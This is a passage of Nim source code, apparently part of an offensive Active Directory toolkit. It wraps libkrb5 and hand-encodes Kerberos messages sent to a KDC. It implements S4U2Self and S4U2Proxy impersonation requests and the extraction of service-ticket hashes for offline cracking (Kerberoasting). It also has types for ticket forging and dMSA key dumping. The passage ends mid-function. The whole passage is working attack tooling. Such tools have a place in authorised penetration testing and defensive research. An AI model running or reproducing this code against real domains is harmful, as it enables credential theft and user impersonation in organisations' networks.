import std/[net, os, random, strutils, times]
import ../../core/scanner as scannercore
import ../../core/proxy as netproxy
import ../smb/client as smb

when defined(linux):
  const krb5Lib = "libkrb5.so.3"
else:
  const krb5Lib = "libkrb5.so.3"

type
  Krb5Int32 = int32
  Krb5ErrorCode = int32
  Krb5Magic = int32
  Krb5Timestamp = int32
  Krb5Deltat = int32
  Krb5Boolean = cuint
  Krb5Flags = int32
  Krb5Enctype = int32
  Krb5Kvno = cuint
  Krb5Context = pointer
  Krb5Principal = pointer
  Krb5Ccache = pointer
  Krb5CcCursor = pointer
  Krb5Keytab = pointer
  Krb5GetInitCredsOpt = pointer
  Krb5Prompter = pointer

  Krb5Data {.bycopy.} = object
    magic: Krb5Magic
    length: cuint
    data: cstring

  Krb5Keyblock {.bycopy.} = object
    magic: Krb5Magic
    enctype: Krb5Enctype
    length: cuint
    contents: pointer

  Krb5EncData {.bycopy.} = object
    magic: Krb5Magic
    enctype: Krb5Enctype
    kvno: Krb5Kvno
    ciphertext: Krb5Data

  Krb5Checksum {.bycopy.} = object
    magic: Krb5Magic
    checksumType: Krb5Int32
    length: cuint
    contents: pointer

  Krb5TicketTimes {.bycopy.} = object
    authtime: Krb5Timestamp
    starttime: Krb5Timestamp
    endtime: Krb5Timestamp
    renewTill: Krb5Timestamp

  Krb5Creds {.bycopy.} = object
    magic: Krb5Magic
    client: Krb5Principal
    server: Krb5Principal
    keyblock: Krb5Keyblock
    times: Krb5TicketTimes
    isSkey: Krb5Boolean
    ticketFlags: Krb5Flags
    addresses: pointer
    ticket: Krb5Data
    secondTicket: Krb5Data
    authdata: pointer

  Krb5KeytabEntry {.bycopy.} = object
    magic: Krb5Magic
    principal: Krb5Principal
    timestamp: Krb5Timestamp
    vno: Krb5Kvno
    key: Krb5Keyblock

  KerberoastResult* = object
    success*: bool
    user*: string
    realm*: string
    spn*: string
    hash*: string
    message*: string

  TicketRequestResult* = object
    success*: bool
    operation*: string
    principal*: string
    service*: string
    ccache*: string
    message*: string

  ForgeTicketResult* = object
    success*: bool
    operation*: string
    principal*: string
    service*: string
    ccache*: string
    message*: string

  CcacheEntry* = object
    client*: string
    server*: string
    enctype*: int
    sessionKeyHex*: string
    startTime*: int64
    endTime*: int64
    renewTill*: int64
    flags*: int
    ticketLen*: int

  CcacheDescribeResult* = object
    success*: bool
    operation*: string
    ccache*: string
    principal*: string
    entries*: seq[CcacheEntry]
    message*: string

  KirbiConvertResult* = object
    success*: bool
    operation*: string
    input*: string
    output*: string
    principal*: string
    ticketCount*: int
    message*: string

  Tlv = object
    tag: int
    body: string
    next: int

  RawTgsCred = object
    keyType: int
    keyValue: string
    ticket: string
    times: Krb5TicketTimes
    flags: int
    decPlain: string

  DmsaKeyEntry* = object
    enctype*: int
    keyHex*: string

  DmsaKeysResult* = object
    success*: bool
    operation*: string
    principal*: string
    ccache*: string
    message*: string
    currentKeys*: seq[DmsaKeyEntry]
    prevKeys*: seq[DmsaKeyEntry]

proc krb5_init_context(ctx: ptr Krb5Context): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_free_context(ctx: Krb5Context) {.importc, dynlib: krb5Lib.}
proc krb5_parse_name(ctx: Krb5Context; name: cstring; princ: ptr Krb5Principal): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_free_principal(ctx: Krb5Context; princ: Krb5Principal) {.importc, dynlib: krb5Lib.}
proc krb5_get_init_creds_opt_alloc(ctx: Krb5Context; opt: ptr Krb5GetInitCredsOpt): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_init_creds_opt_free(ctx: Krb5Context; opt: Krb5GetInitCredsOpt) {.importc, dynlib: krb5Lib.}
proc krb5_get_init_creds_opt_set_etype_list(ctx: Krb5Context; opt: Krb5GetInitCredsOpt; etypes: ptr Krb5Enctype; count: cint): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_init_creds_opt_set_forwardable(opt: Krb5GetInitCredsOpt; forwardable: cint) {.importc, dynlib: krb5Lib.}
proc krb5_get_init_creds_opt_set_proxiable(opt: Krb5GetInitCredsOpt; proxiable: cint) {.importc, dynlib: krb5Lib.}
proc krb5_get_init_creds_password(ctx: Krb5Context; creds: ptr Krb5Creds; client: Krb5Principal;
                                  password: cstring; prompter: Krb5Prompter; data: pointer;
                                  startTime: Krb5Deltat; inTktService: cstring;
                                  opt: Krb5GetInitCredsOpt): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_init_creds_keytab(ctx: Krb5Context; creds: ptr Krb5Creds; client: Krb5Principal;
                                keytab: Krb5Keytab; startTime: Krb5Deltat;
                                inTktService: cstring; opt: Krb5GetInitCredsOpt): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_resolve(ctx: Krb5Context; name: cstring; cache: ptr Krb5Ccache): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_default(ctx: Krb5Context; cache: ptr Krb5Ccache): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_get_principal(ctx: Krb5Context; cache: Krb5Ccache; princ: ptr Krb5Principal): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_initialize(ctx: Krb5Context; cache: Krb5Ccache; principal: Krb5Principal): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_store_cred(ctx: Krb5Context; cache: Krb5Ccache; creds: ptr Krb5Creds): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_close(ctx: Krb5Context; cache: Krb5Ccache): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_start_seq_get(ctx: Krb5Context; cache: Krb5Ccache;
                           cursor: ptr Krb5CcCursor): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_next_cred(ctx: Krb5Context; cache: Krb5Ccache;
                       cursor: ptr Krb5CcCursor; creds: ptr Krb5Creds): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_cc_end_seq_get(ctx: Krb5Context; cache: Krb5Ccache;
                         cursor: ptr Krb5CcCursor): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_credentials(ctx: Krb5Context; options: Krb5Flags; cache: Krb5Ccache;
                          inCreds: ptr Krb5Creds; outCreds: ptr ptr Krb5Creds): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_renewed_creds(ctx: Krb5Context; creds: ptr Krb5Creds;
                            client: Krb5Principal; cache: Krb5Ccache;
                            inTktService: cstring): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_credentials_for_user(ctx: Krb5Context; options: Krb5Flags; cache: Krb5Ccache;
                                   inCreds: ptr Krb5Creds; subjectCert: ptr Krb5Data;
                                   outCreds: ptr ptr Krb5Creds): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_credentials_for_proxy(ctx: Krb5Context; options: Krb5Flags; cache: Krb5Ccache;
                                    inCreds: ptr Krb5Creds; evidenceTicket: pointer;
                                    outCreds: ptr ptr Krb5Creds): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_free_creds(ctx: Krb5Context; creds: ptr Krb5Creds) {.importc, dynlib: krb5Lib.}
proc krb5_free_cred_contents(ctx: Krb5Context; creds: ptr Krb5Creds) {.importc, dynlib: krb5Lib.}
proc krb5_decode_ticket(code: ptr Krb5Data; rep: ptr pointer): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_free_ticket(ctx: Krb5Context; ticket: pointer) {.importc, dynlib: krb5Lib.}
proc krb5_kt_resolve(ctx: Krb5Context; name: cstring; keytab: ptr Krb5Keytab): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_kt_add_entry(ctx: Krb5Context; keytab: Krb5Keytab; entry: ptr Krb5KeytabEntry): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_kt_close(ctx: Krb5Context; keytab: Krb5Keytab): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_get_error_message(ctx: Krb5Context; code: Krb5ErrorCode): cstring {.importc, dynlib: krb5Lib.}
proc krb5_free_error_message(ctx: Krb5Context; msg: cstring) {.importc, dynlib: krb5Lib.}
proc krb5_unparse_name(ctx: Krb5Context; princ: Krb5Principal; name: ptr cstring): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_free_unparsed_name(ctx: Krb5Context; name: cstring) {.importc, dynlib: krb5Lib.}
proc krb5_c_encrypt_length(ctx: Krb5Context; enctype: Krb5Enctype; inputlen: csize_t;
                           length: ptr csize_t): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_c_encrypt(ctx: Krb5Context; key: ptr Krb5Keyblock; usage: Krb5Int32;
                    cipherState: pointer; input: ptr Krb5Data;
                    output: ptr Krb5EncData): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_c_decrypt(ctx: Krb5Context; key: ptr Krb5Keyblock; usage: Krb5Int32;
                    cipherState: pointer; input: ptr Krb5EncData;
                    output: ptr Krb5Data): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_c_make_checksum(ctx: Krb5Context; cksumtype: Krb5Int32;
                          key: ptr Krb5Keyblock; usage: Krb5Int32;
                          input: ptr Krb5Data; cksum: ptr Krb5Checksum): Krb5ErrorCode {.importc, dynlib: krb5Lib.}
proc krb5_free_checksum_contents(ctx: Krb5Context; cksum: ptr Krb5Checksum) {.importc, dynlib: krb5Lib.}

proc krb5Error(ctx: Krb5Context; code: Krb5ErrorCode): string =
  let msg = krb5_get_error_message(ctx, code)
  if msg != nil:
    result = $msg
    krb5_free_error_message(ctx, msg)
  if result.len == 0:
    result = "krb5 error " & $code

proc addBytes(data: var string; bytes: openArray[byte]) =
  for b in bytes:
    data.add char(b)

proc addU32Be(data: var string; value: uint32) =
  data.add char((value shr 24) and 0xff)
  data.add char((value shr 16) and 0xff)
  data.add char((value shr 8) and 0xff)
  data.add char(value and 0xff)

proc readU32Be(data: string; offset: int): uint32 =
  if offset + 4 > data.len: return 0
  (uint32(ord(data[offset])) shl 24) or
    (uint32(ord(data[offset + 1])) shl 16) or
    (uint32(ord(data[offset + 2])) shl 8) or
    uint32(ord(data[offset + 3]))

proc u32LeBytes(v: int): string =
  result.add char(v and 0xff)
  result.add char((v shr 8) and 0xff)
  result.add char((v shr 16) and 0xff)
  result.add char((v shr 24) and 0xff)

proc derLen(length: int): string =
  if length < 0x80:
    result.add char(length)
  else:
    var tmp: seq[byte]
    var value = length
    while value > 0:
      tmp.insert(byte(value and 0xff), 0)
      value = value shr 8
    result.add char(0x80 or tmp.len)
    result.addBytes tmp

proc tlv(tag: int; body: string): string =
  result.add char(tag)
  result.add derLen(body.len)
  result.add body

proc seqT(body: string): string = tlv(0x30, body)
proc ctx(n: int; body: string): string = tlv(0xa0 + n, body)
proc app(n: int; body: string): string = tlv(0x60 + n, body)
proc genStr(value: string): string = tlv(0x1b, value)
proc octet(value: string): string = tlv(0x04, value)

proc derInt(value: int): string =
  var bytes: seq[byte]
  var v = value
  if v == 0:
    bytes.add 0
  else:
    while v > 0:
      bytes.insert(byte(v and 0xff), 0)
      v = v shr 8
    if (bytes[0] and 0x80) != 0:
      bytes.insert(0, 0)
  result.add char(0x02)
  result.add derLen(bytes.len)
  result.addBytes bytes

proc derIntSigned(value: int): string =
  if value >= 0:
    return derInt(value)
  var bytes: seq[byte]
  var v = int32(value)
  while true:
    bytes.insert(byte(v and 0xff), 0)
    let signSet = (bytes[0] and 0x80) != 0
    v = v shr 8
    if (v == -1 and signSet) or (v == 0 and not signSet):
      break
  result.add char(0x02)
  result.add derLen(bytes.len)
  result.addBytes bytes

proc kerberosTimeFromUnix(ts: int64): string =
  let utc = fromUnix(ts).utc
  tlv(0x18, utc.format("yyyyMMddHHmmss") & "Z")

proc bitString(bytes: openArray[byte]): string =
  result.add char(0x03)
  result.add derLen(bytes.len + 1)
  result.add char(0)
  result.addBytes bytes

proc principal(nameType: int; parts: seq[string]): string =
  var names = ""
  for part in parts:
    names.add genStr(part)
  seqT(ctx(0, derInt(nameType)) & ctx(1, seqT(names)))

proc readTlv(data: string; offset = 0): Tlv =
  if offset + 2 > data.len:
    return Tlv(tag: -1, next: data.len)
  result.tag = ord(data[offset])
  var pos = offset + 1
  var length = ord(data[pos])
  inc pos
  if (length and 0x80) != 0:
    let count = length and 0x7f
    length = 0
    if pos + count > data.len:
      return Tlv(tag: -1, next: data.len)
    for i in 0 ..< count:
      length = (length shl 8) or ord(data[pos + i])
    pos += count
  if pos + length > data.len:
    return Tlv(tag: -1, next: data.len)
  result.body = data[pos ..< pos + length]
  result.next = pos + length

proc children(data: string): seq[Tlv] =
  var pos = 0
  while pos < data.len:
    let item = readTlv(data, pos)
    if item.tag < 0 or item.next <= pos:
      break
    result.add item
    pos = item.next

proc intValue(data: string): int =
  let t = readTlv(data)
  if t.tag != 0x02: return 0
  for ch in t.body:
    result = (result shl 8) or ord(ch)

proc boolT(value: bool): string = tlv(0x01, if value: "\xff" else: "\x00")

proc fieldBody(seqBody: string; tag: int): string =
  for field in children(seqBody):
    if field.tag == tag:
      return field.body

proc innerSeq(data: string): string =
  let top = readTlv(data)
  if top.tag == 0x30:
    top.body
  else:
    data

proc rawData(data: Krb5Data): string =
  if data.length > 0 and data.data != nil:
    result = newString(int(data.length))
    copyMem(addr result[0], data.data, int(data.length))

proc rawKey(key: Krb5Keyblock): string =
  if key.length > 0 and key.contents != nil:
    result = newString(int(key.length))
    copyMem(addr result[0], key.contents, int(key.length))

proc encryptionKey(enctype: int; key: string): string =
  seqT(ctx(0, derInt(enctype)) & ctx(1, octet(key)))

proc encryptedData(enctype: int; cipher: string; kvno = 0): string =
  var body = ctx(0, derInt(enctype))
  if kvno > 0:
    body.add ctx(1, derInt(kvno))
  body.add ctx(2, octet(cipher))
  seqT(body)

proc parseBitStringInt(data: string): int =
  let t = readTlv(data)
  if t.tag != 0x03 or t.body.len < 2:
    return 0
  for i in 1 ..< t.body.len:
    result = (result shl 8) or ord(t.body[i])

proc flagsToBitString(flags: int): string =
  bitString([
    byte((flags shr 24) and 0xff),
    byte((flags shr 16) and 0xff),
    byte((flags shr 8) and 0xff),
    byte(flags and 0xff)
  ])

proc splitPrincipalName(name: string): tuple[realm: string; parts: seq[string]; nameType: int] =
  let at = name.rfind("@")
  let left =
    if at >= 0: name[0 ..< at]
    else: name
  result.realm =
    if at >= 0: name[at + 1 .. ^1]
    else: ""
  for part in left.split('/'):
    if part.len > 0:
      result.parts.add part
  result.nameType = if result.parts.len > 1: 2 else: 1

proc parsePrincipalAsn1(data: string): tuple[nameType: int; parts: seq[string]] =
  let outer = readTlv(data)
  let body = if outer.tag == 0x30: outer.body else: data
  for field in children(body):
    case field.tag
    of 0xa0:
      result.nameType = intValue(field.body)
    of 0xa1:
      let namesSeq = readTlv(field.body)
      if namesSeq.tag == 0x30:
        for item in children(namesSeq.body):
          if item.tag in [0x1b, 0x1c]:
            result.parts.add item.body
    else:
      discard

proc realmFromField(data: string): string =
  let t = readTlv(data)
  if t.tag in [0x1b, 0x1c]:
    t.body
  else:
    ""

proc parseKerberosTime(data: string): int32 =
  let t = readTlv(data)
  if t.tag notin [0x18, 0x17] or t.body.len < 15:
    return int32(getTime().toUnix())
  try:
    let s = t.body
    let dt = dateTime(
      parseInt(s[0 .. 3]), Month(parseInt(s[4 .. 5])),
      parseInt(s[6 .. 7]), parseInt(s[8 .. 9]),
      parseInt(s[10 .. 11]), parseInt(s[12 .. 13]),
      zone = utc())
    result = int32(dt.toTime().toUnix())
  except CatchableError:
    result = int32(getTime().toUnix())

proc principalPartsFromName(name: string): seq[string] =
  var n = name
  let at = n.find('@')
  if at >= 0:
    n = n[0 ..< at]
  for part in n.split('/'):
    if part.len > 0:
      result.add part
  if result.len == 0:
    result.add n

proc userPart(name: string): string =
  let parts = principalPartsFromName(name)
  if parts.len > 0: parts[0] else: name

proc checksum(cksumType: int; value: string): string =
  seqT(ctx(0, derIntSigned(cksumType)) & ctx(1, octet(value)))

proc kerbHmacMd5Checksum(key: string; usage: int; data: string): string =
  let ksign = smb.hmacMd5(key, "signaturekey\x00")
  let md5hash = smb.md5Digest(u32LeBytes(usage) & data)
  smb.hmacMd5(ksign, md5hash)

proc servicePartsFromSpn(spn: string): seq[string] =
  var n = spn
  let at = n.find('@')
  if at >= 0:
    n = n[0 ..< at]
  for part in n.split('/'):
    if part.len > 0:
      result.add part

proc patchTicketSnameType(ticket: string; nameType: int): string =
  result = ticket
  let top = readTlv(result)
  if top.tag != 0x61:
    return
  let seq = readTlv(top.body)
  if seq.tag != 0x30:
    return
  let seqStart = result.len - top.body.len + (seq.next - seq.body.len)
  for field in children(seq.body):
    if field.tag != 0xa2:
      continue
    let snameOuterOffset = seqStart + field.next - field.body.len
    let snameSeq = readTlv(field.body)
    if snameSeq.tag != 0x30:
      return
    let snameSeqStart = snameOuterOffset + (snameSeq.next - snameSeq.body.len)
    for sf in children(snameSeq.body):
      if sf.tag == 0xa0:
        let intT = readTlv(sf.body)
        if intT.tag == 0x02 and intT.body.len == 1:
          let valueOffset = snameSeqStart + sf.next - sf.body.len + intT.next - intT.body.len
          if valueOffset >= 0 and valueOffset < result.len:
            result[valueOffset] = char(nameType and 0xff)
        return

proc encryptWithKrb5Key(ctx: Krb5Context; key: ptr Krb5Keyblock; usage: int;
                        plain: string; err: var string): string =
  if key == nil or key.contents == nil or key.length == 0:
    err = "empty Kerberos session key"
    return ""
  var plainCopy = plain
  var input = Krb5Data(magic: 0, length: cuint(plainCopy.len),
    data: if plainCopy.len > 0: cast[cstring](addr plainCopy[0]) else: nil)
  var outLen: csize_t = 0
  var code = krb5_c_encrypt_length(ctx, key.enctype, csize_t(plainCopy.len), addr outLen)
  if code != 0 or outLen == 0:
    err = krb5Error(ctx, code)
    return ""
  result = newString(int(outLen))
  var enc = Krb5EncData(magic: 0, enctype: key.enctype, kvno: 0,
    ciphertext: Krb5Data(magic: 0, length: cuint(outLen),
      data: cast[cstring](addr result[0])))
  code = krb5_c_encrypt(ctx, key, Krb5Int32(usage), nil, addr input, addr enc)
  if code != 0:
    err = krb5Error(ctx, code)
    result = ""
    return
  result.setLen(int(enc.ciphertext.length))

proc decryptWithKrb5Key(ctx: Krb5Context; key: ptr Krb5Keyblock; usage: int;
                        enc: Krb5EncData; err: var string): string =
  if key == nil or key.contents == nil or key.length == 0:
    err = "empty Kerberos session key"
    return ""
  if enc.ciphertext.length == 0 or enc.ciphertext.data == nil:
    err = "empty encrypted payload"
    return ""
  result = newString(int(enc.ciphertext.length))
  var output = Krb5Data(magic: 0, length: cuint(result.len),
    data: cast[cstring](addr result[0]))
  var encCopy = enc
  let code = krb5_c_decrypt(ctx, key, Krb5Int32(usage), nil, addr encCopy, addr output)
  if code != 0:
    err = krb5Error(ctx, code)
    result = ""
    return
  result.setLen(int(output.length))

proc buildApReq(ctx: Krb5Context; realm, sourceName, ticketRaw: string;
                key: ptr Krb5Keyblock; err: var string; kdcTime: int64 = 0): string =
  let nowUnix = if kdcTime > 0: kdcTime else: getTime().toUnix()
  let auth = app(2, seqT(
    ctx(0, derInt(5)) &
    ctx(1, genStr(realm.toUpperAscii())) &
    ctx(2, principal(1, principalPartsFromName(sourceName))) &
    ctx(4, derInt(0)) &
    ctx(5, kerberosTimeFromUnix(nowUnix))
  ))
  let cipher = encryptWithKrb5Key(ctx, key, 7, auth, err)
  if cipher.len == 0:
    return ""
  app(14, seqT(
    ctx(0, derInt(5)) &
    ctx(1, derInt(14)) &
    ctx(2, bitString([byte 0x00, 0x00, 0x00, 0x00])) &
    ctx(3, patchTicketSnameType(ticketRaw, 1)) &
    ctx(4, encryptedData(key.enctype, cipher))
  ))

proc kdcRequestTcp(kdc: string; payload: string; timeoutMs: int): string =
  let dialHost = netproxy.proxySocketHost(kdc)
  let af = if ':' in dialHost: Domain.AF_INET6 else: Domain.AF_INET
  var sock = newSocket(af, SockType.SOCK_STREAM, Protocol.IPPROTO_TCP, buffered = false)
  try:
    netproxy.connectTcpSync(sock, kdc, 88, timeoutMs)
    var framed = ""
    framed.addU32Be(payload.len.uint32)
    framed.add payload
    sock.send(framed)
    var header = newString(4)
    var got = sock.recv(header, 4, timeoutMs)
    if got != 4:
      return ""
    let total = int(readU32Be(header, 0))
    if total <= 0:
      return ""
    var chunk = newString(min(4096, total))
    while result.len < total:
      got = sock.recv(chunk, min(chunk.len, total - result.len), timeoutMs)
      if got <= 0:
        return ""
      result.add chunk[0 ..< got]
  except CatchableError:
    result = ""
  finally:
    try: sock.close()
    except CatchableError: discard

proc parseKrbError(data: string; kdcStime: var int64): string =
  let top = readTlv(data)
  if top.tag != 0x7e:
    return "KDC returned an unexpected Kerberos response"
  let seq = readTlv(top.body)
  if seq.tag != 0x30:
    return "KDC returned malformed KRB-ERROR"
  var code = -1
  var text = ""
  for field in children(seq.body):
    case field.tag
    of 0xa6: code = intValue(field.body)
    of 0xa4:
      let t = readTlv(field.body)
      if t.tag in [0x18, 0x1b, 0x1c]:
        kdcStime = parseKerberosTime(field.body).int64
    of 0xab:
      let t = readTlv(field.body)
      if t.tag in [0x1b, 0x1c]:
        text = t.body
    else: discard
  if code >= 0 and text.len > 0:
    "KDC error " & $code & " (" & text & ")"
  elif code >= 0:
    "KDC error " & $code
  else:
    "KDC returned KRB-ERROR"

proc buildRawS4U2ProxyReq(ctx: Krb5Context; realm, impersonateUser, targetSpn,
                          sourceName, tgtTicket, evidenceTicket: string;
                          tgtKey: ptr Krb5Keyblock; err: var string;
                          rbcd = true; kdcTime: int64 = 0; u2u = false;
                          evidenceIsU2U = false): string =
  randomize()
  let apReq = buildApReq(ctx, realm, sourceName, tgtTicket, tgtKey, err, kdcTime)
  if apReq.len == 0:
    return ""
  let paTgs = seqT(ctx(1, derInt(1)) & ctx(2, octet(apReq)))
  let pacOptions = seqT(ctx(0, bitString([byte 0x10, 0x00, 0x00, 0x00])))
  let paPac = seqT(ctx(1, derInt(167)) & ctx(2, octet(pacOptions)))
  let etypes = seqT(derInt(23) & derInt(16) & derInt(3) & derInt(tgtKey.enctype))
  let opts =
    if u2u: bitString([byte 0x40, 0x83, 0x00, 0x08])
    elif rbcd: bitString([byte 0x40, 0x83, 0x00, 0x00])
    else: bitString([byte 0x40, 0x83, 0x00, 0x00])
  let additionalTickets = seqT(evidenceTicket)
  let nowUnix = if kdcTime > 0: kdcTime else: getTime().toUnix()
  let body = seqT(
    ctx(0, opts) &
    ctx(2, genStr(realm.toUpperAscii())) &
    ctx(3, principal(2, servicePartsFromSpn(targetSpn))) &
    ctx(5, kerberosTimeFromUnix(nowUnix + 86400)) &
    ctx(7, derInt(rand(0x7fffffff))) &
    ctx(8, etypes) &
    ctx(11, additionalTickets)
  )
  app(12, seqT(
    ctx(1, derInt(5)) &
    ctx(2, derInt(12)) &
    ctx(3, seqT(if rbcd: paTgs & paPac else: paTgs)) &
    ctx(4, body)
  ))

proc buildRawS4U2SelfReq(ctx: Krb5Context; realm, impersonateUser, sourceName,
                         tgtTicket: string; tgtKey: ptr Krb5Keyblock;
                         err: var string; rbcd = false; kdcTime: int64 = 0; u2u = false): string =
  randomize()
  let apReq = buildApReq(ctx, realm, sourceName, tgtTicket, tgtKey, err, kdcTime)
  if apReq.len == 0:
    return ""
  let impUser = userPart(impersonateUser)
  let userRealm = realm.toLowerAscii()
  let reqRealm = realm.toUpperAscii()
  let keyBytes = rawKey(tgtKey[])
  if keyBytes.len == 0:
    err = "empty TGT session key"
    return ""
  let s4uBytes = u32LeBytes(1) & impUser & userRealm & "Kerberos"
  let paForUser = seqT(
    ctx(0, principal(1, @[impUser])) &
    ctx(1, genStr(userRealm)) &
    ctx(2, checksum(-138, kerbHmacMd5Checksum(keyBytes, 17, s4uBytes))) &
    ctx(3, genStr("Kerberos"))
  )
  let paTgs = seqT(ctx(1, derInt(1)) & ctx(2, octet(apReq)))
  let paUser = seqT(ctx(1, derInt(129)) & ctx(2, octet(paForUser)))
  let selfPacOptions = seqT(ctx(0, bitString([byte 0x10, 0x00, 0x00, 0x00])))
  let selfPaPac = seqT(ctx(1, derInt(167)) & ctx(2, octet(selfPacOptions)))
  let etypes = seqT(derInt(tgtKey.enctype) & derInt(23))
  let opts =
    if u2u: bitString([byte 0x40, 0x81, 0x00, 0x18])
    else: bitString([byte 0x40, 0x81, 0x00, 0x00])
  let snameCtx = ctx(3, principal(0, principalPartsFromName(sourceName)))
  let nowUnix = if kdcTime > 0: kdcTime else: getTime().toUnix()
  let bodyBase =
    ctx(0, opts) &
    ctx(2, genStr(reqRealm)) &
    snameCtx &
    ctx(5, kerberosTimeFromUnix(nowUnix + 86400)) &
    ctx(7, derInt(rand(0x7fffffff))) &
    ctx(8, etypes)
  let body = seqT(
    if u2u: bodyBase & ctx(11, seqT(tgtTicket))
    else: bodyBase
  )
  app(12, seqT(
    ctx(1, derInt(5)) &
    ctx(2, derInt(12)) &
    ctx(3, seqT(paTgs & paUser & (if rbcd: selfPaPac else: ""))) &
    ctx(4, body)
  ))

proc parseEncryptedDataFull(data: string): tuple[etype: int; kvno: int; cipher: string] =
  let body = innerSeq(data)
  for field in children(body):
    case field.tag
    of 0xa0:
      result.etype = intValue(field.body)
    of 0xa1:
      result.kvno = intValue(field.body)
    of 0xa2:
      let c = readTlv(field.body)
      if c.tag == 0x04:
        result.cipher = c.body
    else:
      discard

proc parseRawTgsRepToCred(ctx: Krb5Context; response: string; userPrinc,
                          targetPrinc: Krb5Principal; tgtKey: ptr Krb5Keyblock;
                          err: var string; kdcStime: var int64): RawTgsCred =
  let top = readTlv(response)
  if top.tag == 0x7e:
    err = parseKrbError(response, kdcStime)
    return
  if top.tag != 0x6d:
    err = "KDC did not return TGS-REP"
    return
  let seq = readTlv(top.body)
  if seq.tag != 0x30:
    err = "malformed TGS-REP"
    return
  let ticket = fieldBody(seq.body, 0xa5)
  let encBody = fieldBody(seq.body, 0xa6)
  if ticket.len == 0 or encBody.len == 0:
    err = "TGS-REP missing ticket or encrypted part"
    return
  let parsedEnc = parseEncryptedDataFull(encBody)
  var cipherCopy = parsedEnc.cipher
  var enc = Krb5EncData(magic: 0, enctype: Krb5Enctype(parsedEnc.etype),
    kvno: Krb5Kvno(parsedEnc.kvno),
    ciphertext: Krb5Data(magic: 0, length: cuint(cipherCopy.len),
      data: if cipherCopy.len > 0: cast[cstring](addr cipherCopy[0]) else: nil))
  var plain = decryptWithKrb5Key(ctx, tgtKey, 8, enc, err)
  if plain.len == 0:
    err = "TGS-REP decrypt failed: " & err
    return
  let encTop = readTlv(plain)
  if encTop.tag != 0x7a:
    err = "malformed decrypted EncTGSRepPart"
    return
  let encSeq = readTlv(encTop.body)
  if encSeq.tag != 0x30:
    err = "malformed decrypted EncTGSRepPart sequence"
    return
  let keyBody = fieldBody(encSeq.body, 0xa0)
  var keySeq = innerSeq(keyBody)
  var keyType = 0
  var keyValue = ""
  for field in children(keySeq):
    case field.tag
    of 0xa0: keyType = intValue(field.body)
    of 0xa1:
      let t = readTlv(field.body)
      if t.tag == 0x04: keyValue = t.body
    else: discard
  if keyType == 0 or keyValue.len == 0:
    err = "EncTGSRepPart missing service session key"
    return
  let nowTs = int32(getTime().toUnix())
  var times = Krb5TicketTimes(authtime: nowTs, starttime: nowTs,
    endtime: nowTs + 36000, renewTill: nowTs + 86400)
  var flags = 0
  for field in children(encSeq.body):
    case field.tag
    of 0xa4: flags = parseBitStringInt(field.body)
    of 0xa5: times.authtime = parseKerberosTime(field.body)
    of 0xa6: times.starttime = parseKerberosTime(field.body)
    of 0xa7: times.endtime = parseKerberosTime(field.body)
    of 0xa8: times.renewTill = parseKerberosTime(field.body)
    else: discard
  result = RawTgsCred(keyType: keyType, keyValue: keyValue, ticket: ticket,
    times: times, flags: flags, decPlain: plain)

proc hexByte(value: int): string =
  const digits = "0123456789abcdef"
  result.add digits[(value shr 4) and 0xf]
  result.add digits[value and 0xf]

proc toHex(data: string): string =
  for ch in data:
    result.add hexByte(ord(ch))

proc fromHexNibble(ch: char): int =
  case ch
  of '0'..'9': ord(ch) - ord('0')
  of 'a'..'f': ord(ch) - ord('a') + 10
  of 'A'..'F': ord(ch) - ord('A') + 10
  else: -1

proc hexToRaw(hex: string): string =
  var s = hex.strip()
  if s.startsWith(":"):
    s = s[1 .. ^1]
  if s.len != 32 and s.len != 64:
    return ""
  var i = 0
  while i + 1 < s.len:
    let hi = fromHexNibble(s[i])
    let lo = fromHexNibble(s[i + 1])
    if hi < 0 or lo < 0:
      return ""
    result.add char((hi shl 4) or lo)
    inc i, 2

proc parseEncryptedData(data: string): tuple[etype: int; cipher: string] =
  let outer = readTlv(data)
  let body = if outer.tag == 0x30: outer.body else: data
  for field in children(body):
    case field.tag
    of 0xa0:
      result.etype = intValue(field.body)
    of 0xa2:
      let c = readTlv(field.body)
      if c.tag == 0x04:
        result.cipher = c.body
    else:
      discard

proc parseTicketHash(ticket, user, spn: string): tuple[ok: bool; hash: string; message: string] =
  let top = readTlv(ticket)
  if top.tag != 0x61:
    return (false, "", "service ticket parse failed")
  let seq = readTlv(top.body)
  if seq.tag != 0x30:
    return (false, "", "malformed service ticket")
  var realm = ""
  var enc = ""
  for field in children(seq.body):
    case field.tag
    of 0xa1:
      let r = readTlv(field.body)
      if r.tag in [0x1b, 0x1c]:
        realm = r.body
    of 0xa3:
      enc = field.body
    else:
      discard
  if enc.len == 0:
    return (false, "", "service ticket missing encrypted part")
  let ed = parseEncryptedData(enc)
  if ed.cipher.len <= 16:
    return (false, "", "service ticket cipher too short")
  let cleanSpn = spn.replace(":", "~")
  case ed.etype
  of 23, 3:
